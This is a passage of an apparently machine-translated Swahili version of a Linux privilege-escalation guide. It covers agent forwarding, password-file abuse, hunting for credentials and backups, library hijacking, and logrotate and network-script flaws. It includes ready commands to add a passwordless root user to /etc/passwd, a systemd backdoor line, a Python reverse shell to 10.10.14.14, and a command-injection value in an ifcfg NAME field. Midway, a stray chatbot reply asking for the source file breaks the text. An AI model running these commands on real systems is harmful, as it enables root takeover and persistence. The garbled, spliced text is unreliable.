Mkonfigurisho huo utaonyesha kwamba ikiwa utajaribu kuingia kwa kutumia ufunguo **private** wa mtumiaji "**testusername**", ssh italinganisha public key ya ufunguo wako na zile zinazopo katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha kutumia local SSH keys zako badala ya kuacha keys (bila passphrases!) zikiwa kwenye server yako. Hivyo, utaweza kupiga ssh kwenda host moja na kutoka huko kupiga ssh kwenda host nyingine ukitumia key iliyoko kwenye host ya awali.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*`, kila mara mtumiaji anapohamia mashine tofauti, host hiyo itakuwa na uwezo wa kupata keys (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kuibadilisha** chaguo hizi na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** ssh-agent forwarding kwa neno muhimu `AllowAgentForwarding` (default ni kuruhusu).

Ikiwa utagundua kuwa Forward Agent imewekwa katika mazingira soma ukurasa ufuatao kwani **huenda ukaweza kuutumia vibaya ili kupandisha ruhusa**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Mafaili ya Kuvutia

### Mafaili ya profile

Faili `/etc/profile` na mafaili yaliyomo chini ya `/etc/profile.d/` ni **scripti zinazotekelezwa wakati mtumiaji anapoanzisha shell mpya**. Kwa hivyo, ikiwa unaweza **kuandika au kubadilisha chochote kati yao, unaweza kupandisha ruhusa**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa script ya profile isiyokuwa ya kawaida inapatikana, unapaswa kuikagua kwa **maelezo nyeti**.

### Faili za Passwd/Shadow

Kutegemea mfumo wa uendeshaji (OS), faili za `/etc/passwd` na `/etc/shadow` zinaweza kutumia jina tofauti au kunaweza kuwa na nakala ya kuhifadhi. Kwa hivyo inapendekezwa **zipate zote** na **kuangalia ikiwa unaweza kuzisoma** ili kuona **ikiwa kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au faili sawa).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Inayoweza kuandikwa /etc/passwd

Kwanza, tengeneza password kwa mmoja wa amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don't have the contents of src/linux-hardening/privilege-escalation/README.md. Please paste the file (or the parts you want translated) so I can translate them to Swahili and keep the exact markdown/html syntax.

Also confirm how you want the `hacker` user added:
- Should I generate a secure password for `hacker` (default 16 chars, mixed-case, digits, symbols)?
- Do you want the password shown plaintext in the translated file, or only the commands to set it (e.g., using chpasswd or passwd)?
- Any UID/GID, shell, or sudo privileges required?

If you want me to generate a password now, say yes (and optionally specify length/requirements) and I'll include the generated password and example commands to create the user.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa kutumia `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji bandia bila nenosiri.\
ONYO: unaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
KUMBUKUMBU: Katika majukwaa ya BSD `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye baadhi ya **faili za usanidi wa huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kuhariri faili ya usanidi ya huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kuhariri mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Kagua Mafolda

Mafolda yafuatayo yanaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda huwezi kusoma ile ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Ajabu/Faili za Owned
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Mafaili yaliyobadilishwa katika dakika chache zilizopita
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml faili
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Nakili za akiba**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Mafaili yanayojulikana yanayoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazoweza kuwa na nywila**.\
**Chombo kingine cha kuvutia** unachoweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo huria inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logi

Ikiwa unaweza kusoma logi, unaweza kugundua **taarifa za kuvutia/za siri ndani yake**. Kadri logi inavyoshangaza zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (labda).\
Pia, baadhi ya "**bad**" zilizopangwa vibaya (backdoored?) **logi za ukaguzi** zinaweza kukuruhusu **kurekodi nywila** ndani ya logi za ukaguzi kama ilivyoelezwa katika chapisho hili: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logi**, kikundi [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Faili za Shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Pia unapaswa kuangalia faili zinazojumuisha neno "**password**" katika **jina** lao au ndani ya **yaliyomo**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\

Sitaorodhesha hapa jinsi ya kufanya haya yote, lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Faili zinazoweza kuandikwa

### Python library hijacking

Ikiwa unajua **wapi** script ya python itatekelezwa na **unaweza kuandika ndani** ya folda hiyo au unaweza **modify python libraries**, unaweza kubadilisha OS library na kui-backdoor (ikiwa unaweza kuandika mahali ambapo script ya python itatekelezwa, nakili na ubandike maktaba ya os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Utekelezaji wa logrotate

Uvunjaji wa usalama katika `logrotate` unawawezesha watumiaji walio na **idhinisho la kuandika** kwenye faili ya logi au kwenye saraka zake za mzazi kupata kwa njia ya uwezekano ruhusa zilizoinuliwa. Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kudhibitiwa ili kutekeleza faili yoyote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua idhini sio tu katika _/var/log_ bali pia katika saraka yoyote ambapo rotation ya logi inafanyika.

> [!TIP]
> Uvunjaji huu wa usalama unaathiri toleo la `logrotate` `3.18.0` na la zamani

Taarifa zaidi za kina kuhusu uvunjaji huu zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Uvunjaji huu ni karibu sawa na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** kwa hivyo kila unapogundua unaweza kubadilisha logs, angalia ni nani anayesimamia logs hizo na angalia kama unaweza kupandisha ruhusa kwa kubadilisha logs kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Rejeo la uvunjaji:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Iwapo, kwa sababu yoyote, mtumiaji ataweza **kuandika** script ya `ifcf-<whatever>` katika _/etc/sysconfig/network-scripts_ **au** anaweza **kurekebisha** iliyopo, basi mfumo wako ume **pwned**.

Script za mtandao, _ifcg-eth0_ kwa mfano hutumika kwa muunganisho wa mtandao. Zinaonekana kabisa kama faili za .INI. Hata hivyo, zinakuwa \~sourced\~ kwenye Linux na Network Manager (dispatcher.d).

Kwa upande wangu, thamani ya `NAME=` iliyowekwa katika script hizi za mtandao haishughulikiwi vyema. Ikiwa una **nafasi tupu/blank katika jina mfumo unajaribu kutekeleza sehemu baada ya nafasi hiyo tupu/blank**. Hii inamaanisha kwamba **kila kitu baada ya nafasi tupu ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Network na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` is home to **skripti** for System V init (SysVinit), the **classic Linux service management system**. It includes skripti to `start`, `stop`, `restart`, and sometimes `reload` services. These can be executed directly or through symbolic links found in `/etc/rc?.d/`. An alternative path in Redhat systems is `/etc/rc.d/init.d`.

On the other hand, `/etc/init` is associated with **Upstart**, a newer **service management** introduced by Ubuntu, using configuration files for service management tasks. Despite the transition to Upstart, SysVinit skripti are still utilized alongside Upstart configurations due to a compatibility layer in Upstart.

**systemd** emerges as a modern initialization and service manager, offering advanced features such as on-demand daemon starting, automount management, and system state snapshots. It organizes files into `/usr/lib/systemd/` for distribution packages and `/etc/systemd/system/` for administrator modifications, streamlining the system administration process.

## Njia zingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks commonly hook a syscall to expose privileged kernel functionality to a userspace manager. Weak manager authentication (e.g., signature checks based on FD-order or poor password schemes) can enable a local app to impersonate the manager and escalate to root on already-rooted devices. Learn more and exploitation details here:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery in VMware Tools/Aria Operations can extract a binary path from process command lines and execute it with -v under a privileged context. Permissive patterns (e.g., using \S) may match attacker-staged listeners in writable locations (e.g., /tmp/httpd), leading to execution as root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ulinzi wa Kernel

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Chombo bora cha kutafuta Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Orodhesha udhaifu wa kernel kwenye Linux na MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (ufikiaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
